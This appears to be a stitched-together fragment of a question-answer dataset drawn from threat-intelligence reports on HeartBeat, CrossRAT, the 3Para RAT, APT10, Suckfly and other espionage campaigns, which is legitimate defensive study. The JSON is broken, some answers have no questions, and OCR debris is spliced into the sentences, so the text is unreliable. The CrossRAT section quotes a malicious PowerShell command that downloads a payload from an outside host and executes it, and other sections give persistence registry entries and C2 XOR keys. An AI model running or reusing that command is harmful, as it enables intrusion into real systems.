\"20\"\nStart = \"2\"\nImagePath = \"%SystemRoot%\\System32\\svchost.exe -k netsvcs\"\nObjectName = \"LocalSystem\"\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Parameters ServiceDll = C:\\Program Files\\Windows NT\\htrn. dll\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Security Security = {values}\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\nServices\\{service name}\\Enum\n0 = \"Root\\LEGACY_{service name}\\0000\"\nCount = \"1\"\nNextInstance = \"1\"\n*{service name} may be \"6to4\", \"Ias\" or \"Irmon\".\nThe service is then invoked once installed. This results in the .DLL being injected to svchost.exe process. This registry modification allows the RAT to execute upon every system startup.\nAfter installation the RAT installer deletes itself, which leaves only the disguised .DLL and related registry entries on the affected system.\nNote that the presence of any of the files or registries above may be an indication of a possible HeartBeat infection in a system.\nMedium Headline: C&C Communication\nOnce the RAT's .DLL component has been injected to svchost.exe, the malware attempts to register itself to the C&C server by sending the following information from the affected system:\n\u2022 Computer name\n\u2022 Local IP address\n\u2022 Service pack\nThese data are sent along with a campaign code and the string \"qawsed\". While the \"qawsed\" string is not present in earlier versions of their RAT, we suspect that the attackers only recently added this as a default campaign password.\nThe RAT's C&C communication is encrypted with XOR encryption using a single byte key, 02H. Furthermore, the data being transferred and received by the RAT C&C are 800H (2,048 bytes) in size.\nDuring the RAT's phone home, the following TCP traffic is observed on the network:\nWhen decrypted, the above traffic looks as follows:\nThe majority of the RAT variants used port 80. Recent variants, however, were observed to use port 443. Other ports we have seen being utilized are port 5600 and port 8080.\nEarlier RAT variants did not use encryption on their C&C communication. Moreover, they only sent the computer name and campaign code during phone home. Below is a screenshot of the unencrypted C&C communication.\nThe C&C traffic size also varied in previous versions. Some early variants used traffic that are 28H (40 bytes) and 1004H (4,100 bytes) in size.\nAdditionally, the port, C&C address, campaign code and password are hardcoded in the RAT's malware body in plain text. In some RAT versions, however, they are encrypted and are decrypted only during run-time, possibly to protect the RAT from static analysis by security researchers.\nThese variations in their RAT component indicate that it has since been undergoing development.\nBig Headline: CommAnd And Control\nThe HeartBeat campaign's C&C domains appear to utilize a site redirection service. Their C&C sites redirect to IP addresses from ISPs in Armenia, USA, Japan, India and Korea. We observed that they updated the IP address of some of their C&C domains. Likewise, all of their IP addresses belong to legitimate ISPs. Considering this, we suspect that these IP addresses are compromised hosts that act as proxy servers which redirects traffic to the actual C&C servers. Again, this adds another layer of anonymity to the HeartBeat perpetrators.\nBig Headline: heArtbeAt CAmPAign Codes And deCoy doCuments\nThe campaign codes and decoy documents used by the HeartBeat attackers provided valuable insights on their campaigns. In fact, majority of their campaign codes included number combinations which represented the month and date in MMDD format when the attack attempt was executed. The rest of the campaign code string often describes the decoy document that was used in a specific campaign. For instance, a campaign code from October 2011 is \"army-1022\" where attackers used a decoy document containing military-related information.\nOn the other hand, decoy documents' contents were also very specific to their targets. For example, some of these documents included logos of specific groups. This information helped us identify their targeted organizations and communities in their previous campaigns.\n\nWhat are the primary functionalities of the HeartBeat campaign's RAT component? Explain how these functionalities give attackers control over the victim's system.",
    "output": "The HeartBeat campaign's RAT component allows attackers to remotely execute various commands on affected hosts. These commands include listing running processes and their respective process IDs, downloading and executing files, updating or uninstalling itself, creating or terminating processes, listing available drives, listing existing files and their creation dates, uploading or deleting files, getting file creation dates, opening a remote command shell access, and rebooting the system. These functionalities give attackers complete control over their victims' systems, allowing them to manipulate files, execute commands, and even cover their tracks by uninstalling the RAT.",

    "instruction": "Big Headline: It Takes Two to Tango:\nGlobalization has woven the Internet into a fabric that interlaces practically every aspect of modern living. Throughout the years, as evidenced in countless media reports, world superpowers have recognized and utilized the Internet as a powerful source for intelligence collection, and on occasion we have been offered glimpses as to how they are leveraging cyber espionage in support of their national diplomatic, military or economic objectives.\nSimilar to a younger sibling looking up to a big brother, regional and middle powers within South Asia are seeking to leverage global cyber espionage in an effort to achieve parity with nation states who have far-reaching diplomatic power, modernized militaries and influential economies. Ultimately, these emergent economies are likely seeking to hasten their path to success in fulfilling national objectives via the \"short-cut\" that cyber espionage offers.\nIndividual countries within the Indo-Pak subcontinent are increasingly involved in cyber attacks and targeted espionage campaigns. South Asia is no stranger to deeply rooted conventional conflict which is most often a strong harbinger of cyber conflict. On March 17th, 2013, the Norwegian-based, global telecommunications provider Telenor reported a network breach from an unknown sophisticated threat actor that targeted Telenor executives using custom malware implants. The attackers were responsible for pilfering email archives and documents from Telenor executives, compromising their intellectual property and business operations.\nNearly two months later, the Norwegian antivirus and security firm Norman issued an investigative analysis report titled Operation Hangover: Unveiling an Indian Cyberattack Infrastructure that detailed cyber espionage activities associated with the Telenor compromise. They noted similar targeting campaigns that were observed exploiting numerous industries and organizations within Norway, Pakistan, US, Iran, China, Taiwan, Thailand, Jordan, Indonesia, UK, Germany, Austria, Poland, and Romania. Norman speculated that a group associated with an identified private Indian information security company likely carried out the espionage campaigns.\nNorman's 43 page assessment concluded that a sophisticated Indian exploitation team was indeed responsible for the network breach and Telenor compromise. The TCIRT believes that a possible theory that supports an Indian attack scenario is that the Telenor subsidiary, Telenor Pakistan, is a strategic communications infrastructure provider. Telenor Pakistan provides voice, data content and mobile communications to more than 3,500 cities and towns within Pakistan. Persistent remote Indian access to a strategic communications service provider, such as Telenor Pakistan, would certainly yield unparalleled signals intelligence collection capability. The information obtained would be of strategic value to Indian intelligence services.\nBig Headline: New Findings:\nIn light of the recent revelation of Indian involvement in the targeting of Telenor, it is critical for us to consider the borderless nature of cyber espionage and to understand how regional cyber conflicts can spill across geographies and affect critical commercial business operations.\nAs part of an ongoing TCIRT focused research and analysis, we have found custom malware being used operationally \"in the wild\" that may be targeting Indian military and government related entities, as well as other unidentified South Asian targets. This activity is possibly linked to an identified Pakistani information security company.\nBig Headline: The Malware:\nIn late May 2013, TCIRT identified a malicious file hosted at [http://]199.91.173[.]43/new_salary/salary_revision.scr (Kansas City, Missouri). This file was a self-extracting (SFX) archive that, when executed, presents the target victim with a 12 page decoy PDF document. The document was an official Government of India (GoI), Ministry of Defense (MoD) pension memorandum of record. It is highly likely that the malware and decoy document would be tailored for and delivered to specific recipients associated with the GoI or MoD.\nThe SFX dropper contained multiple custom executable files, as well as legitimate Microsoft Visual C++ Runtime Library files, which are part of the codebase used to develop and required to execute the backdoor code. The malware also uses the legitimate cURL library in the form of libcurld.dll. The open-source cURL library is a multiprotocol transfer library used primarily for FTP and HTTP transactions.\nThe main backdoor component is found in winsocks.exe. The files ExtractPDF.exe and Start.exe simply serve as utilities to open the PDF file and execute the winsocks.exe backdoor component. When executed, the winsocks.exe backdoor requests a PHP update callback at [http://]199.91.173[.]43/fetch_updates_8765.php?compname=<COMPUTERNAME>.\nA version.txt file is also requested by the malware. This file contained a version number 1.0, likely denoting the version of the backdoor and/or the command and control (C2) backend. The winsocks.exe backdoor also contains hardcoded strings of Office file extensions, telegraphing the likely intention of the attackers in collecting and exfiltrating office automated documents from victim networks.\nAnother variant of this backdoor uses the same winsocks.exe with a different dropping mechanism and was found at [http://]199.91.173[.]43/Classified_Video.flv.scr and [http://]199.91.173[.]43/sarbajit_leaked_video.wmv.scr. Both of these .scr files have the same MD5.\nIn this SFX, Windows batch files had replaced the ExtractPDF.exe and Start.exe with a decoy Flash video (FLV) file was used in place of the decoy PDF. An FLV file is an interesting choice of decoy document since it is not a standard video format for media players. The dynamic DNS domains windowsupdate.no-ip[.]biz and masalavideos.no-ip[.]biz were also being mapped to IP Address 199.91.173.43 as of late May 2013, when the video themed malicious attachments were being operationalized. When opened the flash video simply displays a couple kissing passionately. Implementing the use of free dynamic DNS services, such as those of NO-IP within targeting and exploitation phases of attack, are very common techniques used by a variety sophisticated threat groups.\nThe file sarbajit_leaked_video.wmv.scr contains a compile time of May 28, 2013 19:53:26 UTC. The filename is possibly a misspelled reference to Sarabjit Singh, an Indian national who was arrested and convicted of terrorism and espionage charges in 1991 by Pakistani authorities. After a protracted 22 year legal battle, Sarabjit Singh would become the victim of a severe beating by Pakistani prisoners and would later die of his injuries in a Lahore hospital on May 2, 2013. News of the attack and subsequent death of Sarabjit Singh incited protests in India that increased regional Indo-Pakistani tensions and served as a catalyst for bilateral governmental negotiations between Delhi and Islamabad. This file was created 26 days after the death of Sarabjit Singh, and would be of relevance to targeted Indian entities, much like the official Government of India (GoI), Ministry of Defense (MoD) pension memorandum.\n\nBased on the above text, answer a question. What are the strategic implications of the Telenor breach for Indian intelligence services, and how might persistent remote access to Telenor Pakistan benefit them?",

    "instruction": "Small Headline: CrossRAT\nWhile investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was developed by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to manipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on the infected system.\nWhen executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\\Local\\ Temp\\mediamgrs.jar before, like Bandook, creating an auto-start registry key in HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the name \"mediamgrs\".\nOn OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions to write to this directory, it will fail back to the following path under the user's home directory: $HOME/Library/mediamgrs.jar. For CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure that it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file to $HOME/.config/autostart/mediamgrs.desktop.\nCrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over  the wire from a compromised machine:\n5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows 7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&\nCrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to terminate the response string and uses @### to start command strings.\nBelow is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed port of 2223, are clearly visible.\n(continued from page 34)\nAnalysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under development. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read files, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample we discovered was last modified in March of 2017.\nSmall Headline: Infected Documents\nWe identified several Word documents which appear to be intended for use as infection vectors in phishing attacks. None of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target system. If executed in an environment that has macros enabled, the malware downloads its second stage components. We saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The following script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash e5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc).\nSmall Headline: Other Samples\nSurprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for software documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in Windows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from the server cma-cgrm[.]com. Below is the command contained in the malicious .chm file.\ncmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile\n-WindowStyle Hidden (New-Object\nSystem.Net.WebClient).DownloadFile('https://cma-    cgrm[.]com/ebusiness/ne.abc','%TEMP%\\chmplg.exe');Start-Process %TEMP%\\chmplg.exe;\nAt the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and does not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.\nQuestion: How does CrossRAT achieve persistence on different operating systems, and what are the implications of this capability for cybersecurity experts?",
    "output": "Answer: CrossRAT achieves persistence on different operating systems through various methods. On Windows, it copies itself to %AppData%\\\\Local\\\\Temp\\\\mediamgrs.jar and creates an auto-start registry key in HKEY_USERS\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run with the name 'mediamgrs'. On OSX, it writes a copy of itself to /usr/var/mediamgrs.jar or $HOME/Library/mediamgrs.jar if it lacks sufficient permissions, and creates a Launch Agent under $HOME/Library/LaunchAgents/mediamgrs.plist. On Linux, it writes an autorun file to $HOME/.config/autostart/mediamgrs.desktop. The implications for cybersecurity experts are that CrossRAT can maintain its presence on infected systems even after reboots, making it harder to detect and remove.

Between February 11 and February 15, 2014, the websites of the US Veterans of Foreign Wars (VFW.org) and the home page of a large European aerospace manufacturer both became victims of watering-hole attacks. Similar to the 2012 attacks, the sites were forced to redirect to an exploit for a previously unknown zero-day vulnerability in Internet Explorer (CVE-2014-0322) in order to deliver a malicious payload.

Black Vine's continuous campaigns against targeted industries, beginning in late 2012, fit the TTPs associated with organized cyberespionage actors.\nCertain Black Vine infrastructure seems to be associated with the Beijing-based security organization Topsec. The relationship with Black Vine and Topsec provides evidence of the past or present geography of at least some actors involved in this group's activity.\nAccess to the Elderwood framework is another indicator that Black Vine is in working relationships with actors associated with widely reported cyberespionage attacks over the past several years.

    "output": "W32.Stuxnet manipulates the frequency converter drives by sending specific sequences that alter their operational frequencies. During sequence 1, Stuxnet sets the frequency to 1410Hz. In sequence 2, it initially sets the frequency to 2Hz and then to 1064Hz. These changes are significant because they disrupt the normal operation of the industrial control systems. By setting the frequency to 1410Hz, Stuxnet likely aims to cause physical damage to the machinery, as this frequency is higher than the typical operating range of 807 Hz to 1210 Hz. The sequence 2 frequencies, starting at 2Hz and then increasing to 1064Hz, could be designed to induce instability or further damage, potentially leading to equipment failure.",

The initial beacon uses a request with four parameters (h1, h2, h3, and h4) \u2013 as shown in Figure 8 \u2013 to register the implant with the C2 server.\n\u2022 Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE.\n\u2022 The commands supported by the RAT enable several capabilities, including:\no remote shell\no listing of running processes (including loaded modules)\no Process termination (specified by PId)\no File and directory listing\no File upload, download, deletion, and timestamp modification\nExample Beacon\nruecaller hared by\nredacted)\nSmall Headline: 3Para rat \u2013 EXaMPlE Md5 HasH BC4E9dad71B844dd3233CFBBB96C1Bd3\nFigure 9. sample Python Code to  decode Hostname from User-agent snippet\nthe 3Para rat was described in some detail in other Crowdstrike reporting, which examined a dll-based sample with an exported filename of ssdpsvc.dll. other observed exported filenames are msacem.dll and mrpmsg.dll, although the rat has also been observed in plain executable (EXE) format.\non startup, the rat attempts to create a file mapping named &*sdKJfhksdf89*dIUKJdsF&*sdfsdf78sdfsdf. this is used to prevent multiple instances of the rat being executed simultaneously. the rat will then use a byte-wise subtraction-based algorithm (using a hard-coded modulo value) to decode C2 server details consisting of a server hostname and port number, in this example nsc.adomhn. com, port 80. the decoding algorithm is illustrated in Figure 10 below. the key and modulo values vary on a per-sample basis. decoded C2 settings, along with sample metadata, are listed in appendix 2.\nthe rat is programmed in C++ using Microsoft Visual studio, and it makes use of the object-oriented and parallel programming features of this environment; standard template library (stl) objects are used to represent data structures such as strings and lists, and custom objects are used to represent some of the C2 command handlers (e.g., CCommandCMd). several threads are used to handle different stages of the C2 protocol, such as receiving data from the server, decrypting data, and processing commands. standard Windows primitives such as Events are used to synchronize across these threads, with a shared global structure used to hold state.\nFigure 10. sample Python Code Illustrating C2 server decoding routine\nscreenshot of truecaller once running, the rat will load a binary representation of a date/time value13 from a Database shared by  file C:\\rECYClEr\\restore.dat, and it will sleep until after this date/time has passed. this provides a mechanism for the operators to allow the rat to remain dormant until a DEaDEyE JacKaL on their twitter account (names fixed time, perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system. redacted)\nas with the 4H rat, the C2 protocol used by the 3Para rat is HttP based, using both GEt and Post requests. an initial request is made to the C2 server (illustrated in Figure 11 above), but the response value is effectively ignored; it is likely that this request serves only as a connectivity check, as further C2 activity will only occur if this first request is successful. In this case, the rat will transmit some basic victim information to the C2 server along with a 256-byte hash of the hard-coded string HYF54&%9&jkMCXuis. It is likely that this request functions as a means to authenticate the rat to the C2 server and register a new victim machine with the controller. a sample request and its structure are shown in Figure 12.\n13Using the standard Windows SYSTEMTIME structure\n14See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API, which is rarely used.\nIf this request is also successful, the rat will attempt to retrieve tasking from the controller using a further distinctive HttP request shown in Figure 13, repeating this request every two seconds until valid tasking is returned.\nscreenshot of truecaller\nDatabase shared by\nreturned tasking is decrypted using the dEs algorithm in CBC mode with a key derived from the Md5 hash of the string HYF54&%9&jkMCXuis (as used in the secondary beacon shown above). If this fails, the rat will fall back to decoding the data using an 8-byte Xor with a key derived from data returned from the Hashdata aPI with the same key string. output data produced by tasking instructions is encrypted in the same manner as it was decrypted and sent back to the C2 server via HttP Post request to a UrI of the form /microsoft/errorpost/ default.aspx?Id=, where the Id value is a random number in decimal representation \u2013 as with the initial request shown in Figure 4.\nthe set of commands supported by the rat is somewhat limited, indicating that perhaps the rat is intended to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a compromised system (which is consistent with its support for sleeping until a certain date/time). some of the supported commands are implemented using C++ classes derived from a base CCommand class:\n\u2022 CCommandAttribe \u2013 Retrieve metadata for files on disk, or set certain attributes such as creation/ modification timestamps.\n\u2022 CCommandCD \u2013 Change the working directory for the current C2 session.\n\u2022 CCommandCMD \u2013 Execute a command, with standard input/output/error redirected over the C2 channel.\n\u2022 CCommandNOP \u2013 List the current working directory.\nscreenshot of truecaller\nDatabase shared by\nDEaDEyE JacKaL on their\ntwitter account (names\nredacted)However, other commands are not implemented in this way. these other commands contain functionality to:\n\u2022 Pause C2 activity for a random time interval.\n\u2022 Shutdown C2 activity and exit.\n\u2022 Provide a date and time before which beaconing will not resume, recorded in the file C:\\RECYCLER\\ restore.dat as noted above.\nthe use of C++ classes that inherit from a base class to carry out some of the tasking commands, along with the use of concurrency features, indicates that the developers of the rat put some thought into the architecture and design of their tool, although the decision to implement some commands outside of the class-based framework is curious, and may indicate multiple developers worked on the rat (or a single developer with shifting preferences for his coding style).\nRead the text above and answer this question: How does the 4H RAT used by PUtter Panda establish communication with its Command and Control (C2) server, and what encryption methods are employed in this process?",

PwC UK and BAE Systems, working closely with industry and government, have uncovered a new, unparallelled campaign which we refer to as Operation Cloud Hopper. This operation has targeted managed IT service providers, the compromise of which provides APT10 with potential access to thousands of further victims. An additional campaign has also been observed targeting Japanese entities.\nAPT10's malware toolbox shows a clear evolution from malware commonly associated with China-based threat actors towards bespoke in-house malware that has been used in more recent campaigns; this is indicative of APT10's increasing sophistication, which is highly likely to continue. The threat actor's known working hours align to Chinese Standard Time (CST) and its targeting corresponds to that of other known China-based threat actors, which supports our assessment that these campaigns are conducted by APT10.\nThis campaign serves to highlight the importance of organisations having a comprehensive view of their threat profile, including that of their supply chain's. More broadly, it should also encourage organisations to fully assess the risk posed by their third party relationships, and prompt them to take appropriate steps to assure and manage these.\nA detailed technical annex supplements this main report, which provides further information about the tools and techniques used by APT10 and contains Indicators of Compromise relating to all of this threat actor's known campaigns. These have already been provided to the National Cyber Security Centre for dissemination through their usual channels.\n\nHow does APT10's evolution in malware usage reflect its increasing sophistication, and what implications does this have for organizations seeking to defend against such threats?",

This transition indicates that APT10 is continuously adapting its tactics to evade detection and enhance its capabilities. For organizations, this means that traditional defenses against known malware may not be sufficient. They need to adopt more advanced threat detection and response mechanisms that can identify and mitigate bespoke and evolving threats.

    "output": "The shift in measuring the success of botnets from the quantity of infected systems to the quality of targeted systems indicates that attackers are focusing on precision and stealth rather than widespread infection. This means that even a small number of strategically chosen infected systems can yield powerful results for the attackers. For companies, especially those in targeted industries, this necessitates a robust perimeter security strategy. Active intrusion detection and prevention systems, along with DNS monitoring for malicious domains, become essential for detecting such targeted attacks.

    "output": "A: The discovery of code snippets and techniques used in the Deep Panda APT on Chinese language forums and websites has significant implications for the attribution process. It suggests that the attackers may have sourced or shared their code from these forums, indicating a potential link to Chinese-speaking actors. For example, the obfuscation of the KdDisableDebugger() function call and the system call hooking methods are found on Chinese forums. The driver code's similarity to the HookSSDT.c code authored by Steven Lai, a Chinese developer, further supports this attribution. These findings provide corroborating evidence that helps CrowdStrike attribute the APT to a Chinese-speaking actor, even though compiler artifacts and language settings can be masked or spoofed.",

    "instruction": "Answer based on context:\n\nMedium Headline: An appetite for stolen code\u00adsigning certificates\nSuckfly has a number of hacktools and malware varieties at its disposal. Figure 1 identifies the malware and tools based on functionality and the number of signed files with unique hashes associated with them.\nThe first signed hacktool we identified in late 2015 was a digitally signed brute\u00adforce server message block (SMB) scanner. The organization associated with this certificate is a South Korean mobile software developer. While we became initially curious because the hacktool was signed, we became more suspicious when we realized a mobile software developer had signed it, since this is not the type of software typically associated with a mobile application.\nBased on this discovery, we began to look for other binaries signed with the South Korean mobile software developer's certificate. This led to the discovery of three additional hacktools also signed using this certificate. In addition to being signed with a stolen certificate, the identified hacktools had been used in suspicious activity against a US\u00adbased health provider operating in India. This evidence indicates that the certificate's rightful owner either misused it or it had been stolen from them. Symantec worked with the certificate owner to confirm that the hacktool was not associated with them.\nFollowing the trail further, we traced malicious traffic back to where it originated from and looked for additional evidence to indicate that the attacker persistently used the same infrastructure. We discovered the activity originated from three separate IP addresses, all located in Chengdu, China.\nIn addition to the traffic originating from Chengdu, we identified a selection of hacktools and malware signed using nine stolen certificates.\nThe nine stolen certificates originated from nine different companies who are physically located close together around the central districts of Seoul, South Korea. Figure 2 shows the region in which the companies are located.\nWhile we do not know the exact circumstances of how the certificates were stolen, the most likely scenario was that the companies were breached with malware that had the ability to search for and extract certificates from within the organization. .\nThe organizations who owned the stolen certificates were from four industries (see Figure 3).\nMedium Headline: A timeline of misuse\nWe don't know the exact date Suckfly stole the certificates from the South Korean organizations. However, by analyzing the dates when we first saw the certificates paired with hacktools or malware, we can gain insight into when the certificates may have been stolen. Figure 4 details how many times each stolen certificate was used in a given month.\nThe first sighting of three of the nine stolen certificates being used maliciously occurred in early 2014. Those three certificates were the only ones used in 2014, making it likely that the other six were not compromised until 2015. All nine certificates were used maliciously in 2015.\nBased on the data in Figure 4, the first certificates used belonged to Company A (educational software developer) and Company B (video game developer #2). Company A's certificate was used for over a year, from April 2014 until June 2015 and Company B's certificate was used for almost a year, from July 2014 until June 2015. When we discovered this activity, neither company was aware that their certificates had been stolen or how they were being used. Since the companies were unaware of the activity, neither stolen certificate had been revoked. When a certificate is revoked, the computer displays a window explaining that the certificate cannot be verified and should not be trusted before asking the user if they want to continue with the installation.\nMedium Headline: Signed, sealed, and delivered\nAs noted earlier, the stolen certificates Symantec identified in this investigation were used to sign both hacking tools and malware. Further analysis of the malware identified what looks like a custom back door. We believe Suckfly specifically developed the back door for use in cyberespionage campaigns. Symantec detects this threat as .\nAnalysis of Nidiran samples determined that the back door had been updated three times since early 2014, which fits the timeline outlined in Figure 4. The modifications were minor and likely performed to add capabilities and avoid detection. While the malware is custom, it only provides the attackers with standard back door capabilities.\nSuckfly delivered Nidiran through a strategic web compromise. Specifically, the threat group used a specially crafted web page to deliver an exploit for the (CVE\u00ad2014\u00ad6332), which affects specific versions of Microsoft Windows. This exploit is triggered when a potential victim browses to a malicious page using Internet Explorer, which can allow the attacker to execute code with the same privileges as the currently logged\u00adin user.\nOnce exploit has been achieved, Nidiran is delivered through a self\u00adextracting executable that extracts the components to a .tmp folder after it has been executed. The threat then executes \"svchost.exe\", a PE file, which is actually a clean tool known as OLEVIEW.EXE. The executable will then load iviewers.dll, which is normally a clean, legitimate file. Attackers have been known to distribute malicious files masquerading as the legitimate iviewers.dll file and then use DLL load hijacking to execute the malicious code and infect the computer. This and is frequently used in China\u00adbased cyberespionage activity.\nMedium Headline: High demand for code\u00adsigning certificates\nThe Blackfly attacks share some similarities with the more recent Suckfly attacks. Blackfly began with a campaign to steal certificates, which were later used to sign malware used in targeted attacks. The certificates Blackfly stole were also from South Korean companies, primarily in the video game and software development industry. Another similarity is that Suckfly stole a certificate from Company D (see Figure 4) less than two years after Blackfly had stolen a certificate from the same company. While the stolen certificates were different, and stolen in separate instances, they were both used with custom malware in targeted attacks originating from China.\nMedium Headline: Why do attackers want signed malware?\nSigning malware with code\u00adsigning certificates is becoming more common, as seen in this investigation and the other attacks we have discussed. Attackers are taking the time and effort to steal certificates because it is becoming necessary to gain a foothold on a targeted computer. Attempts to sign malware with code\u00adsigning certificates have become more common as the Internet and security systems have moved towards a more trust and reputation oriented model. This means that untrusted software may not be allowed to run unless it is signed.\nHowever, using valid code\u00adsigning certificates stolen from organizations with a positive reputation can allow attackers to piggyback on that company's trust, making it easier to slip by these defenses and gain access to targeted computers.\nMedium Headline: Conclusion\nSuckfly paints a stark picture of where cyberattack groups and cybercriminals are focusing their attentions. Our investigation shines a light on an often unknown and seedier secret life of code\u00adsigning certificates, which is completely unknown to their owners. The implications of this study shows that certificate owners need to keep a careful eye on them to prevent them from falling into the wrong hands. It is important to give certificates the protection they need so they can't be used maliciously.\nThe certificates are only as secure as the safeguards that organizations put around them. Once a certificate has been compromised, so has the reputation of the organization who signed it. An organization whose certificate has been stolen and used to sign malware will always be associated with that activity.\nSymantec monitors for this type of activity to help prevent organizations from being tied to malicious actions undertaken with their stolen certificates. During the course of this investigation, we ensured that all certificates compromised by Suckfly were revoked and the affected companies notified.\nAs this trend grows, it is more important than ever for organizations to maintain strong cybersecurity practices and store their certificates and corresponding (<http://www.symantec.com/code-signing/extended-validation/data-sheets-white-papers/>)keys in a secure environment. Using encryption, and services such as , and can provide additional layers of security.\n\nWhy do attackers like Suckfly go through the effort of stealing and using valid code-signing certificates to sign their malware, and what implications does this have for organizations?",
    "output": "Attackers like Suckfly steal and use valid code-signing certificates to sign their malware because it allows them to piggyback on the trust of the organizations whose certificates they have stolen. As security systems move towards a trust and reputation-oriented model, untrusted software may not be allowed to run unless it is signed. By using stolen certificates, attackers can slip by these defenses and gain access to targeted computers. This has serious implications for organizations, as once a certificate is compromised, so is the reputation of the organization. It is crucial for organizations to maintain strong cybersecurity practices and store their certificates and keys in a secure environment to prevent them from being used maliciously.",

    "instruction": "Medium Headline: A New Breed Of Hackers Tracks Online Acts of War\n'Hacktivists' Update Their Mission\nTORONTO -- Here in the Citizen Lab at the University of Toronto, a new breed of hackers is conducting digital espionage.\nThey are among a growing number of investigators who monitor how traffic is routed through countries, where Web sites are blocked and why it's all happening. Now they are turning their scrutiny to a new weapon of international warfare: cyber attacks.\nTracking wars isn't what many of the researchers, who call themselves \"hacktivists,\" set out to do. Many began intending to help residents in countries that censor online content. But as the Internet has evolved, so has their mission.\nRonald J. Deibert, director of the Citizen Lab, calls the organization a \"global civil society counterintelligence agency\" and refers to the lab as the \"NSA of operations.\"\nTheir efforts have ramped up in the past year as researchers gather evidence that Internet assaults are playing a larger role in military strategy and political struggles. Even before Georgia and Russia entered a ground war earlier this month, Citizen Lab's researchers noticed sporadic attacks aimed at several Georgian Web sites. Such attacks are especially threatening to countries that increasingly link critical activities such as banking and transportation to the Internet.\nOnce the fighting began, massive raids on Georgia's Internet infrastructure were deployed using techniques similar to those used by Russian criminal organizations. Then, attacks seemed to come from individuals who found online instructions for launching their own assaults, shutting down much of Georgia's communication system.\nTwo weeks later, researchers are still trying to trace the origins of the attacks. \"These attacks in effect had the same effect that a military attack would have,\" said Rafal Rohozinski, who co-founded the Information Warfare Monitor, which tracks cyber attacks, with Citizen Lab in 2003. \"That suddenly means that in cyberspace anyone can build an A-bomb.\"\nThe cyber attacks that disabled many Georgian and Russian Web sites earlier this month marked the first time such an assault coincided with physical fighting. And the digital battlefield will likely become a permanent front in modern warfare, Deibert said.\nSeven years ago, Deibert opened the Citizen Lab using grant money from the Ford Foundation. Soon after, he and Rohozinski helped begin the OpenNet Initiative, a collaboration with Harvard's Law School, Cambridge and Oxford universities that tracks patterns of Internet censorship in countries that use filters, such as China. The project received an additional $3 million from the MacArthur Foundation. Deibert and Rohozinski also launched the Information Warfare Monitor to investigate how the Internet is used by state military and political operations. And Citizen Lab researchers have created a software tool called Psiphon that helps users bypass Internet filters.\nThe combined projects have about 100 researchers in more than 70 countries mapping Web traffic and testing access to thousands of sites.\nA number of companies specialize in cyber security, and several nonprofit organizations have formed cyber-surveillance projects to keep international vigil over the Web. Shadowserver.org, for example, is a group of 10 volunteer researchers who post their findings about cyber attacks online.\nThe small Toronto office of Citizen Lab, tucked in a basement of the university's Munk Centre for International Studies, serves as the technological backbone for the operations. World maps and newspaper clips cover the walls. Researchers move between multiple computer screens, studying lists of codes with results from field tests in Uzbekistan, Cambodia, Iran and Venezuela, to name a few.\n\"We rely on local experts to help us find out why a particular site is being blocked,\" Deibert said. It could be a problem with the Internet service provider, a temporary connection glitch or a downed server. \"But what's more effective is blasting a site into oblivion when it is strategically important. It's becoming a real arms race.\"\nHe's referring to \"denial of service\" attacks, in which hundreds of computers in a network, or \"botnets,\" simultaneously bombard a Web site with millions of requests, overwhelming and crashing the server. In Georgia, such attacks were strong enough to knock key sources of news and information offline for days.\nGeorgian Internet service providers also limited access to Russian news media outlets, cutting off the only remaining updates about the war. On the night of Aug. 12 -- the height of the fighting -- \"there was panic in Tbilisi brought about by a vacuum of information,\" Rohozinski said.\nShadowserver saw the first denial of service attack against Georgia's presidential Web site July 20. When the fighting began, Andre M. Di Mino, Shadowserver's founder, counted at least six botnets launching attacks, but it was \"difficult to tell if it was a grass-roots effort or one commissioned by the government.\"\nThe organization detects between 30 and 50 denial of service attacks every day around the world, and Di Mino said they have become more sophisticated over the past two years.\n\"It really went from almost a kiddie type of thing to where it's an organized enterprise,\" he said. But he's hesitant to label this month's attacks as a form of cyberwar, although he expects networks to play an expanded role in political clashes.\nJose Nazario, a security researcher with Arbor Networks, said cyber attacks used to target a computer's operating system. But he's seen a \"tremendous rise\" in attacks on Web browsers, allowing attackers access to much more personal information, such as which sites a person visits frequently. An attacker then 